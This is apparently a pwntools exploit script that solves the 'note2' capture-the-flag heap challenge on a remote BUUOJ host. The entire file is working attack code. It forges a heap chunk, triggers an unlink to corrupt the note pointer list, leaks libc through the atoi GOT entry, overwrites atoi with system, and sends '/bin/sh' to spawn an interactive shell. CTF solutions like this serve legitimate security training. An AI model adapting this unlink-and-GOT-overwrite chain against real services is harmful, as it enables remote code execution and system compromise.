from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('note2')
io = remote('node4.buuoj.cn', 29457)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('note2')
ptr_list = 0x602120
atoi_got = elf.got['atoi']


def add(size, content):
    io.sendlineafter('option--->>\n', '1')
    io.sendlineafter('Input the length of the note content:(less than 128)\n', str(size))
    io.sendlineafter('Input the note content:\n', content)


def show(id):
    io.sendlineafter('option--->>\n', '2')
    io.sendlineafter('Input the id of the note:\n', str(id))
    io.recvuntil('Content is ')
    return io.recvline()[:-1]


def edit(id, Type, content):
    io.sendlineafter('option--->>\n', '3')
    io.sendlineafter('Input the id of the note:\n', str(id))
    io.sendlineafter('do you want to overwrite or append?[1.overwrite/2.append]\n', str(Type))
    io.sendlineafter('TheNewContents:', content)


def delete(id):
    io.sendlineafter('option--->>\n', '4')
    io.sendlineafter('Input the id of the note:\n', str(id))

def unlink():
    io.sendlineafter('Input your name:\n', 'a')
    io.sendlineafter('Input your address:\n', 'a')
    add(0, '0')                     # chunk0
    add(0, '1')                     # chunk1
    add(0x80, '2')                  # chunk2
    delete(0)
    fd, bk = ptr_list, ptr_list + 8
    payload = p64(0) + p64(0x31) + p64(fd) + p64(bk) + cyclic(0x10) + p64(0x30) + p64(0x90)
    add(0, payload)                # overwrite chunk2 prev_size size
    delete(2)


def pwn():
    edit(3, 1, p64(atoi_got))
    libc_base = u64(show(0).ljust(8, b'\x00')) - libc.sym['atoi']
    log.success('libc_base: ' + hex(libc_base))
    system = libc_base + libc.sym['system']
    edit(0, 1, p64(system))
    io.sendlineafter('option--->>\n', '/bin/sh')
    io.interactive()


if __name__ == '__main__':
    unlink()
    pwn()
